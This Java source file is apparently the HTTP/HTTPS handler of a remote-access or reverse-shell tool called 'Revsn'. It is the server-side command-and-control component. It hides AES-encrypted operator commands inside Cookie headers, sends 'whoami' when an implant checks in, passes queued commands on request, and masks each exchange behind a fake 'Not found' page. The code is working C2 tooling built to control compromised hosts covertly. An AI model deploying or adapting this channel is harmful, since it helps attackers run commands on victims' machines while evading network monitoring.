package com.revsni.server.http;

import java.io.IOException;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

import org.apache.http.entity.ContentType;
import org.apache.http.entity.StringEntity;
import org.apache.http.HttpException;
import org.apache.http.HttpRequest;
import org.apache.http.HttpResponse;
import org.apache.http.protocol.HttpContext;
import org.apache.http.protocol.HttpRequestHandler;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

//import com.revsni.client.Encri.Encri;
//import com.revsni.client.Encri.RSA;
import com.revsni.server.Protocol;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;

//import java.util.ArrayList;
//import java.util.List;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import org.apache.commons.codec.binary.Base64;

public class HTTPHandler implements HttpRequestHandler, HttpHandler{
    private static final Logger logger = LogManager.getLogger(HTTPHandler.class);
    
    //private volatile List<String> commands = new ArrayList<>();
    private volatile String answerCommands;
    private volatile boolean est = false;
    private SecretKey key;
    private IvParameterSpec iv;
    private SecretKey keyRaw;
    private IvParameterSpec ivRaw;
    private volatile int sessionNumber;
    private volatile String ip;
    private volatile boolean first = true;
    private Protocol protocol;

    private Cipher cipherDec;
    private Cipher cipherEnc;
    //private volatile boolean gotAnswer;

    protected static final StringEntity http404 = new StringEntity("<html><body><h1>Not found</h1></body></html>", ContentType.create("text/html", "UTF-8"));

    protected static final String https404 = new String("<html><body><h1>Not found</h1></body></html>");

    public HTTPHandler(SecretKey key1, IvParameterSpec iv, int sessionNumber) {
        super();
        this.keyRaw = key1;
        this.sessionNumber = sessionNumber;
        this.ivRaw = iv;
        this.key = new SecretKeySpec(key1.getEncoded(), key1.getAlgorithm());
        this.iv = new IvParameterSpec(iv.getIV());

        //AES init
        try {
            cipherDec = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipherDec.init(Cipher.DECRYPT_MODE, this.key, this.iv);

            cipherEnc = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipherEnc.init(Cipher.ENCRYPT_MODE, this.key, this.iv);
        } catch (InvalidKeyException | InvalidAlgorithmParameterException | NoSuchAlgorithmException | NoSuchPaddingException e) {
            e.printStackTrace();
        }

    }

    public HTTPHandler(int sessionNumber, Protocol protocol) {
        super();
        this.sessionNumber = sessionNumber;
        this.protocol = protocol;
    }

    public void sendCommand(String command) {
        String respo = command;
        answerCommands = protocol.prepareMessage(respo, sessionNumber);
        logger.info("Waiting for Response..");
        respo = "";
    } 
    

    @Override
    public void handle(HttpRequest request, HttpResponse response, HttpContext context) throws HttpException, IOException {
        String msg = "";
        String cookie = "";
        if(first) { 
            String[] host = request.getHeaders("Host")[0].getValue().split(":");
            ip = host[0];
            first = false;
        }
        if(request.getRequestLine().getMethod().toUpperCase().contains("GET") && request.getRequestLine().getUri().contains("lit")) {
            response.removeHeaders("Cookie");
            if(request.getHeaders("Cookie") != null) {
                cookie = request.getHeaders("Cookie")[0].getValue();

                if(cookie.length() > 1) {

                    msg = protocol.processMessage(cookie, sessionNumber);
                        //msg = new String(cipherDec.doFinal(Base64.decodeBase64(cookie)));
                    if(msg.equals("est")) {
                        est = true;
                        response.setHeader("Cookie", protocol.prepareMessage("whoami", sessionNumber));
                    } else if(msg.equals("kill")) {
                         response.setHeader("Cookie", protocol.prepareMessage("quit", sessionNumber));
                    } else if(msg.equals("give") && answerCommands.length() > 0) {
                        response.setHeader("Cookie", answerCommands);
                        answerCommands = "";
                    } else if(msg.equals("give") && answerCommands.length() == 0) {
                        response.setHeader("Cookie", "");
                    } else {
                        System.out.print("Revsn [HTTP]["+ ip +"]["+sessionNumber+"]» ");
                    }
                    response.setStatusCode(200);
                    response.setEntity(http404);
                } else {
                    response.setStatusCode(200);
                    response.setEntity(http404);
                }
            }
        }
    }
        
    public boolean getConnInf() {
        return this.est;
    }
        

    //Old for HTTPS
    
    @Override
    public void handle(HttpExchange ex) throws IOException {
        String msg = "";
        String cookie = "";

        logger.info(ex.getRequestMethod());
        
        msg = ex.getRequestHeaders().getFirst("Cookie");

        if(ex.getRequestMethod().equals("GET") && ex.getRequestURI().getPath().contains("lit")) {
            if(msg != null) {
                cookie = msg;

                if(cookie.length() > 1) {

                    try {
                        msg = new String(cipherDec.doFinal(Base64.decodeBase64(cookie)));
                    } catch (IllegalBlockSizeException | BadPaddingException e) {
                        e.printStackTrace();
                    }
                    if(msg.equals("est")) {
                        est = true;
                        try {
                            ex.getResponseHeaders().add("Cookie", Base64.encodeBase64String(cipherEnc.doFinal("whoami".getBytes())));
                        } catch (IllegalBlockSizeException | BadPaddingException e) {
                            logger.info("Failed to send init whoami command (HTTP-Rev)");
                        }
                    } else if(msg.equals("kill")) {
                        try {
                            ex.getResponseHeaders().add("Cookie", Base64.encodeBase64String(cipherEnc.doFinal("quit".getBytes())));
                        } catch (IllegalBlockSizeException | BadPaddingException e) {
                            logger.info("Failed to send Quit command (HTTP-Rev)");
                        }
                    } else if(msg.equals("give") && answerCommands.length() > 0) {
                        ex.getResponseHeaders().add("Cookie", answerCommands);
                        answerCommands = "";
                    } else if(msg.equals("give") && answerCommands.length() == 0) {

                    } else {
                        logger.info(msg);
                        System.out.print("Revsn [HTTPS] » ");
                    }
                    ex.sendResponseHeaders(200, https404.length());
                    OutputStream os = ex.getResponseBody();
                    os.write(https404.getBytes(StandardCharsets.UTF_8));
                    os.close();
                } else {
                    ex.sendResponseHeaders(200, https404.length());
                    OutputStream os = ex.getResponseBody();
                    os.write(https404.getBytes(StandardCharsets.UTF_8));
                    os.close();
                }
            }
        }
        
    }
    
    public SecretKey getKeyRaw() {
        return this.keyRaw;
    }

    public void setKeyRaw(SecretKey keyRaw) {
        this.keyRaw = keyRaw;
    }

    public IvParameterSpec getIvRaw() {
        return this.ivRaw;
    }

    public void setIvRaw(IvParameterSpec ivRaw) {
        this.ivRaw = ivRaw;
    }
    
}